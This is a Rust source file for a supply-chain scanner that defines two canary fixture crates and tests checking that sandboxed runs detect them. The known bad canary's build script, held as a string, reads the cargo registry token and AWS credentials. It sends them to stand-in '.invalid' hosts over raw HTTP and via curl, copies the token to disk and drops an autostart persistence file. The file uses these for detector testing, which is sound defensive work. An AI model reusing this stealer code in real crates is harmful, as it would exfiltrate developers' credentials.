//! Canaries: two inert fixture crates with known behavior (ADR 0008).
//!
//! The known bad canary's build script does what a stealer does: it reads
//! the cargo token and posts it over HTTP, copies it into its build output,
//! drops an autostart file, tries IPv6, and has `curl` post the AWS
//! credentials over HTTPS. Every one of these must be caught. The known good
//! canary has a build script that only prints a cargo instruction; nothing
//! may be flagged. If either expectation fails, verdicts cannot be trusted
//! and the supervisor pauses the stages that produce them.
//!
//! Their sources exist only as strings here. They are packed into the blob
//! store and vendored into a payload like any crate, and compiled and run
//! **only inside a microVM** (docs/TESTING.md). The orchestrator runs them
//! on a schedule and after every warm build; `cargo xtask canary` runs them
//! as a test.

use crateward_core::blobs::{BlobError, BlobStore};
use crateward_core::job::BuildOutcome;
use crateward_core::name::{CrateName, CrateNameError};

use crate::payload::{Package, PayloadSpec};
use crate::trace::{Role, TraceSummary};
use crate::worker::RunReport;

/// A fixture crate and what its run must show.
#[derive(Debug, Clone, Copy)]
pub struct Canary {
    /// Name used for records; also the crate name.
    pub name: &'static str,
    manifest: &'static str,
    build_rs: &'static str,
    check: fn(&RunReport) -> Vec<String>,
}

const VERSION: &str = "0.1.0";

/// Why a canary's payload could not be prepared.
#[derive(Debug, thiserror::Error)]
pub enum CanaryError {
    /// The fixture could not be packed.
    #[error("packing the fixture: {0}")]
    Pack(#[from] std::io::Error),
    /// The blob store refused the fixture.
    #[error(transparent)]
    Blob(#[from] BlobError),
    /// The fixture's name is not a crate name.
    #[error(transparent)]
    Name(#[from] CrateNameError),
}

/// The host the known bad canary posts to.
pub const EXFIL_HOST: &str = "exfil.crateward-canary.invalid";

/// Runs only in the microVM. Steals, copies, persists and phones home.
const BAD_BUILD_RS: &str = r#"use std::io::{Read, Write};
fn main() {
    let home = std::env::var("HOME").unwrap_or_default();
    let mut token = String::new();
    if let Ok(mut file) = std::fs::File::open(format!("{home}/.cargo/credentials.toml")) {
        let _ = file.read_to_string(&mut token);
    }
    if let Ok(mut stream) = std::net::TcpStream::connect("exfil.crateward-canary.invalid:80") {
        let _ = write!(
            stream,
            "POST /collect HTTP/1.1\r\nHost: exfil.crateward-canary.invalid\r\nContent-Length: {}\r\n\r\n{}",
            token.len(),
            token
        );
        let mut reply = Vec::new();
        let _ = stream.read_to_end(&mut reply);
    }
    // Persistence and a copy of the loot on the scratch disk.
    if let Ok(out) = std::env::var("OUT_DIR") {
        let _ = std::fs::write(format!("{out}/stolen.txt"), &token);
    }
    let autostart = format!("{home}/.config/autostart");
    if std::fs::create_dir_all(&autostart).is_ok() {
        let _ = std::fs::write(format!("{autostart}/canary.desktop"), "[Desktop Entry]\n");
    }
    // No IPv6 route in the guest: the attempt fails there, and the trace
    // must still show it.
    if let Ok(target) = "[2001:db8::7]:443".parse() {
        let _ = std::net::TcpStream::connect_timeout(&target, std::time::Duration::from_secs(2));
    }
    let _ = std::process::Command::new("curl")
        .args(["-s", "-m", "10", "-X", "POST", "--data-binary"])
        .arg(format!("@{home}/.aws/credentials"))
        .arg("https://tls.crateward-canary.invalid/collect")
        .status();
}
"#;

/// Runs only in the microVM. Does what an ordinary build script does.
const GOOD_BUILD_RS: &str = "fn main() {\n    println!(\"cargo:rerun-if-changed=build.rs\");\n}\n";

/// The canary that must be caught.
pub const KNOWN_BAD: Canary = Canary {
    name: "canary-exfil",
    manifest: "[package]\nname = \"canary-exfil\"\nversion = \"0.1.0\"\nedition = \"2021\"\nbuild = \"build.rs\"\n",
    build_rs: BAD_BUILD_RS,
    check: check_known_bad,
};

/// The canary that must come out clean.
pub const KNOWN_GOOD: Canary = Canary {
    name: "canary-inert",
    manifest: "[package]\nname = \"canary-inert\"\nversion = \"0.1.0\"\nedition = \"2021\"\nbuild = \"build.rs\"\n",
    build_rs: GOOD_BUILD_RS,
    check: check_known_good,
};

/// Both canaries.
pub const ALL: [Canary; 2] = [KNOWN_BAD, KNOWN_GOOD];

impl Canary {
    fn tar(&self) -> std::io::Result<Vec<u8>> {
        let mut builder = tar::Builder::new(Vec::new());
        for (path, data) in [
            ("Cargo.toml", self.manifest),
            ("build.rs", self.build_rs),
            ("src/lib.rs", ""),
        ] {
            let mut header = tar::Header::new_gnu();
            header.set_size(data.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder.append_data(
                &mut header,
                format!("{}-{VERSION}/{path}", self.name),
                data.as_bytes(),
            )?;
        }
        builder.into_inner()
    }

    /// Stores the fixture and returns the payload of a job for it.
    ///
    /// # Errors
    ///
    /// Fails if the blob store cannot store it.
    pub fn payload(&self, blobs: &BlobStore) -> Result<PayloadSpec, CanaryError> {
        let blob = blobs.put(&self.tar()?)?;
        // Any 64 hex digits do: the lockfile and the vendored checksum file
        // only have to agree.
        let checksum = blob.blake3.clone();
        let lockfile = format!(
            "version = 4\n\n\
             [[package]]\nname = \"{name}\"\nversion = \"{VERSION}\"\n\
             source = \"registry+https://github.com/rust-lang/crates.io-index\"\n\
             checksum = \"{checksum}\"\n\n\
             [[package]]\nname = \"crateward-probe\"\nversion = \"0.0.0\"\n\
             dependencies = [\n \"{name}\",\n]\n",
            name = self.name
        );
        Ok(PayloadSpec {
            name: CrateName::parse(self.name)?,
            version: semver::Version::new(0, 1, 0),
            lockfile,
            packages: vec![Package {
                name: self.name.into(),
                version: VERSION.into(),
                checksum,
                blake3: blob.blake3,
            }],
            extra_probes: Vec::new(),
            files: Vec::new(),
            stubs: Vec::new(),
        })
    }

    /// What the run failed to show; empty when the canary passed.
    #[must_use]
    pub fn check(&self, report: &RunReport) -> Vec<String> {
        (self.check)(report)
    }
}

fn expect(problems: &mut Vec<String>, ok: bool, what: &str) {
    if !ok {
        problems.push(what.to_owned());
    }
}

fn check_known_bad(report: &RunReport) -> Vec<String> {
    let mut p = Vec::new();
    expect(
        &mut p,
        report.outcome == BuildOutcome::Succeeded,
        "the build did not succeed",
    );
    bad_traffic(report, &mut p);
    expect(&mut p, report.trace.complete, "the trace did not end");
    bad_trace(&report.trace, &mut p);
    bad_disk(report, &mut p);
    p
}

/// What the fake internet and the honeytoken search must show.
fn bad_traffic(report: &RunReport, p: &mut Vec<String>) {
    expect(
        p,
        report.network.dns.iter().any(|n| n == EXFIL_HOST),
        "the lookup was not logged",
    );
    let leaked =
        |kind: &str, via: &str| report.leaked.iter().any(|l| l.kind == kind && l.via == via);
    expect(
        p,
        leaked("cargo_registry_token", &format!("http://{EXFIL_HOST}")),
        "the token sent over HTTP was not found",
    );
    expect(
        p,
        leaked("aws_access_key_id", "https://tls.crateward-canary.invalid"),
        "the key sent over HTTPS was not found",
    );
}

/// What the trace must show of the build script and its `curl`.
fn bad_trace(trace: &TraceSummary, p: &mut Vec<String>) {
    let script = trace
        .processes
        .iter()
        .find(|x| x.role == Role::BuildScript && x.exe.contains(KNOWN_BAD.name));
    let Some(script) = script else {
        p.push("the build script is not in the trace".into());
        return;
    };
    let opened = |pid: u32, file: &str| {
        trace
            .sensitive_opens
            .iter()
            .any(|f| f.pid == pid && f.path.ends_with(file))
    };
    expect(
        p,
        opened(script.pid, "/.cargo/credentials.toml"),
        "the credentials read is not in the trace",
    );
    expect(
        p,
        trace
            .sockets
            .iter()
            .any(|s| s.pid == script.pid && s.how == "connect" && s.address.ends_with(":80")),
        "the connect is not in the trace",
    );
    expect(
        p,
        trace
            .sockets
            .iter()
            .any(|s| s.pid == script.pid && s.address == "[2001:db8::7]:443"),
        "the IPv6 attempt is not in the trace",
    );
    let curl = trace
        .processes
        .iter()
        .find(|x| x.ppid == Some(script.pid) && x.exe.ends_with("/curl"));
    expect(
        p,
        curl.is_some_and(|c| opened(c.pid, "/.aws/credentials")),
        "curl reading the AWS file is not in the trace",
    );
}

/// What the scratch disk must show.
fn bad_disk(report: &RunReport, p: &mut Vec<String>) {
    expect(
        p,
        report
            .tokens_on_disk
            .iter()
            .any(|l| l.kind == "cargo_registry_token" && l.via.ends_with("/stolen.txt")),
        "the copied token was not found on disk",
    );
    expect(
        p,
        report.scratch.as_ref().is_some_and(|s| {
            s.outside_build
                .iter()
                .any(|e| e.path == "/work/home/.config/autostart/canary.desktop")
        }),
        "the autostart file was not found on disk",
    );
}

fn check_known_good(report: &RunReport) -> Vec<String> {
    let mut p = Vec::new();
    expect(
        &mut p,
        report.outcome == BuildOutcome::Succeeded,
        "the build did not succeed",
    );
    expect(&mut p, report.trace.complete, "the trace did not end");
    expect(
        &mut p,
        report.leaked.is_empty()
            && report.tokens_in_trace.is_empty()
            && report.tokens_on_disk.is_empty(),
        "a honeytoken was flagged",
    );
    let t = &report.trace;
    expect(
        &mut p,
        t.sensitive_opens.is_empty() && t.writes_outside_work.is_empty(),
        "a file access was flagged",
    );
    expect(&mut p, t.sockets.is_empty(), "a socket was flagged");
    expect(&mut p, t.tamper.is_empty(), "a tamper attempt was flagged");
    let n = &report.network;
    expect(
        &mut p,
        n.dns.is_empty() && n.connections.is_empty() && n.packets.is_empty(),
        "network traffic was flagged",
    );
    expect(
        &mut p,
        report.scratch.as_ref().is_some_and(|s| {
            s.error.is_none()
                && s.outside_build.is_empty()
                && s.executables_outside_target.is_empty()
                && s.planted_changed.is_empty()
        }),
        "the scratch disk was flagged",
    );
    p
}

#[cfg(test)]
mod tests {
    use crateward_fake_internet::sniff::Sniffed;

    use super::*;
    use crate::scratch::{Entry, ScratchReport};
    use crate::trace::{FileAccess, Process, SocketUse, Tamper, TraceSummary};
    use crate::worker::{Connection, Leak, NetworkSummary};

    #[test]
    fn fixtures_pack_and_name_themselves() {
        for canary in ALL {
            let tar = canary.tar().unwrap();
            let mut archive = tar::Archive::new(tar.as_slice());
            let names: Vec<String> = archive
                .entries()
                .unwrap()
                .map(|e| e.unwrap().path().unwrap().to_string_lossy().into_owned())
                .collect();
            assert!(names.contains(&format!("{}-0.1.0/build.rs", canary.name)));
            assert!(canary.manifest.contains(canary.name));
        }
    }

    fn store(test: &str) -> (std::path::PathBuf, BlobStore) {
        let root = std::env::temp_dir().join(format!("cw-canary-{}-{test}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let blobs = BlobStore::open(&root).unwrap();
        (root, blobs)
    }

    #[test]
    fn a_payload_vendors_the_stored_fixture() {
        let (root, blobs) = store("stored");
        for canary in ALL {
            let spec = canary.payload(&blobs).unwrap();
            assert_eq!(spec.packages[0].name, canary.name);
            assert!(blobs.contains(&spec.packages[0].blake3));
            assert!(spec.lockfile.contains(&spec.packages[0].checksum));
        }
        std::fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn a_blob_store_that_cannot_write_fails_the_payload() {
        let (root, blobs) = store("broken");
        std::fs::remove_dir_all(root.join("blobs")).unwrap();
        std::fs::write(root.join("blobs"), b"in the way").unwrap();
        let error = KNOWN_GOOD.payload(&blobs).unwrap_err();
        std::fs::remove_dir_all(&root).unwrap();
        assert!(
            matches!(error, CanaryError::Blob(BlobError::Io { .. })),
            "{error}"
        );
    }

    fn run(outcome: BuildOutcome) -> RunReport {
        RunReport {
            outcome,
            end: String::new(),
            exit: None,
            restore_ms: 0,
            run_ms: 0,
            stdout_tail: String::new(),
            stderr_tail: String::new(),
            truncated: false,
            payload_files: 0,
            payload_bytes: 0,
            missing_packages: Vec::new(),
            network: NetworkSummary::default(),
            leaked: Vec::new(),
            trace: TraceSummary::default(),
            tokens_in_trace: Vec::new(),
            scratch: None,
            tokens_on_disk: Vec::new(),
        }
    }

    fn process(pid: u32, ppid: u32, exe: &str, role: Role) -> Process {
        Process {
            pid,
            ppid: Some(ppid),
            exe: exe.into(),
            argv: Vec::new(),
            role,
            started_ms: 0,
            exit: None,
            ended_ms: None,
            became_root: false,
        }
    }

    fn open(pid: u32, path: &str) -> FileAccess {
        FileAccess {
            pid,
            exe: String::new(),
            path: path.into(),
            flags: 0,
            ms: 0,
        }
    }

    fn socket(pid: u32, how: &str, address: &str) -> SocketUse {
        SocketUse {
            pid,
            exe: String::new(),
            how: how.into(),
            address: address.into(),
            sock_type: 1,
            ms: 0,
        }
    }

    fn leak(kind: &str, via: &str) -> Leak {
        Leak {
            kind: kind.into(),
            via: via.into(),
        }
    }

    fn entry(path: &str) -> Entry {
        Entry {
            path: path.into(),
            kind: "file".into(),
            size: 0,
            mode: 0o644,
            uid: 0,
            target: None,
        }
    }

    const SCRIPT: &str =
        "/work/target/debug/build/canary-exfil-0123456789abcdef/build-script-build";

    /// A run of the known bad canary that shows everything it must.
    fn caught() -> RunReport {
        let mut report = run(BuildOutcome::Succeeded);
        report.network.dns = vec![EXFIL_HOST.into()];
        report.leaked = vec![
            leak("cargo_registry_token", &format!("http://{EXFIL_HOST}")),
            leak("aws_access_key_id", "https://tls.crateward-canary.invalid"),
        ];
        report.trace.complete = true;
        report.trace.processes = vec![
            process(10, 1, SCRIPT, Role::BuildScript),
            process(11, 10, "/usr/bin/curl", Role::Other),
        ];
        report.trace.sensitive_opens = vec![
            open(10, "/work/home/.cargo/credentials.toml"),
            open(11, "/work/home/.aws/credentials"),
        ];
        report.trace.sockets = vec![
            socket(10, "connect", "192.0.2.1:80"),
            socket(10, "connect", "[2001:db8::7]:443"),
        ];
        report.tokens_on_disk = vec![leak("cargo_registry_token", "/work/target/out/stolen.txt")];
        report.scratch = Some(ScratchReport {
            outside_build: vec![entry("/work/home/.config/autostart/canary.desktop")],
            ..ScratchReport::default()
        });
        report
    }

    /// A run of the known good canary that shows nothing.
    fn clean() -> RunReport {
        let mut report = run(BuildOutcome::Succeeded);
        report.trace.complete = true;
        report.scratch = Some(ScratchReport::default());
        report
    }

    type Change = fn(&mut RunReport);

    fn scratch(report: &mut RunReport) -> &mut ScratchReport {
        report.scratch.as_mut().unwrap()
    }

    #[test]
    fn a_run_with_the_expected_evidence_passes() {
        assert_eq!(KNOWN_BAD.check(&caught()), Vec::<String>::new());
        assert_eq!(KNOWN_GOOD.check(&clean()), Vec::<String>::new());
    }

    #[test]
    fn the_known_bad_canary_names_each_missing_piece() {
        let cases: [(&str, Change); 12] = [
            ("the build did not succeed", |r| {
                r.outcome = BuildOutcome::Failed;
            }),
            ("the lookup was not logged", |r| r.network.dns.clear()),
            ("the token sent over HTTP was not found", |r| {
                r.leaked.remove(0);
            }),
            ("the key sent over HTTPS was not found", |r| {
                r.leaked.remove(1);
            }),
            ("the trace did not end", |r| r.trace.complete = false),
            ("the build script is not in the trace", |r| {
                r.trace.processes.clear();
            }),
            ("the credentials read is not in the trace", |r| {
                r.trace.sensitive_opens.remove(0);
            }),
            ("the connect is not in the trace", |r| {
                r.trace.sockets.remove(0);
            }),
            ("the IPv6 attempt is not in the trace", |r| {
                r.trace.sockets.remove(1);
            }),
            ("curl reading the AWS file is not in the trace", |r| {
                r.trace.sensitive_opens.remove(1);
            }),
            ("the copied token was not found on disk", |r| {
                r.tokens_on_disk.clear();
            }),
            ("the autostart file was not found on disk", |r| {
                scratch(r).outside_build.clear();
            }),
        ];
        for (problem, change) in cases {
            let mut report = caught();
            change(&mut report);
            assert_eq!(KNOWN_BAD.check(&report), [problem]);
        }
    }

    #[test]
    fn the_known_bad_canary_lists_problems_in_order() {
        let nothing = run(BuildOutcome::Failed);
        assert_eq!(
            KNOWN_BAD.check(&nothing),
            [
                "the build did not succeed",
                "the lookup was not logged",
                "the token sent over HTTP was not found",
                "the key sent over HTTPS was not found",
                "the trace did not end",
                "the build script is not in the trace",
                "the copied token was not found on disk",
                "the autostart file was not found on disk",
            ]
        );
        let mut script_only = run(BuildOutcome::Succeeded);
        script_only.trace.complete = true;
        script_only.trace.processes = vec![process(10, 1, SCRIPT, Role::BuildScript)];
        assert_eq!(
            KNOWN_BAD.check(&script_only),
            [
                "the lookup was not logged",
                "the token sent over HTTP was not found",
                "the key sent over HTTPS was not found",
                "the credentials read is not in the trace",
                "the connect is not in the trace",
                "the IPv6 attempt is not in the trace",
                "curl reading the AWS file is not in the trace",
                "the copied token was not found on disk",
                "the autostart file was not found on disk",
            ]
        );
    }

    #[test]
    fn the_known_good_canary_names_everything_it_flags() {
        let cases: [(&str, Change); 16] = [
            ("the build did not succeed", |r| {
                r.outcome = BuildOutcome::TimedOut;
            }),
            ("the trace did not end", |r| r.trace.complete = false),
            ("a honeytoken was flagged", |r| {
                r.leaked.push(leak("k", "v"));
            }),
            ("a honeytoken was flagged", |r| {
                r.tokens_in_trace.push(leak("k", "v"));
            }),
            ("a honeytoken was flagged", |r| {
                r.tokens_on_disk.push(leak("k", "v"));
            }),
            ("a file access was flagged", |r| {
                r.trace.sensitive_opens.push(open(1, "/x"));
            }),
            ("a file access was flagged", |r| {
                r.trace.writes_outside_work.push(open(1, "/x"));
            }),
            ("a socket was flagged", |r| {
                r.trace.sockets.push(socket(1, "connect", "x"));
            }),
            ("a tamper attempt was flagged", |r| {
                r.trace.tamper.push(Tamper {
                    pid: 1,
                    what: "bpf cmd 5".into(),
                    ms: 0,
                });
            }),
            ("network traffic was flagged", |r| {
                r.network.dns.push("x".into());
            }),
            ("network traffic was flagged", |r| {
                r.network.packets.push("icmp".into());
            }),
            ("network traffic was flagged", |r| {
                r.network.connections.push(Connection {
                    dst: "192.0.2.1:80".into(),
                    sniffed: Sniffed::Unknown,
                    bytes: 0,
                    inner: None,
                });
            }),
            ("the scratch disk was flagged", |r| r.scratch = None),
            ("the scratch disk was flagged", |r| {
                scratch(r).error = Some("unreadable".into());
            }),
            ("the scratch disk was flagged", |r| {
                scratch(r).outside_build.push(entry("/etc/x"));
            }),
            ("the scratch disk was flagged", |r| {
                scratch(r).planted_changed.push("/work/x".into());
            }),
        ];
        for (problem, change) in cases {
            let mut report = clean();
            change(&mut report);
            assert_eq!(KNOWN_GOOD.check(&report), [problem]);
        }
        let mut report = clean();
        scratch(&mut report)
            .executables_outside_target
            .push(entry("/x"));
        assert_eq!(KNOWN_GOOD.check(&report), ["the scratch disk was flagged"]);
        assert_eq!(
            KNOWN_GOOD.check(&run(BuildOutcome::Failed)),
            [
                "the build did not succeed",
                "the trace did not end",
                "the scratch disk was flagged",
            ]
        );
    }
}
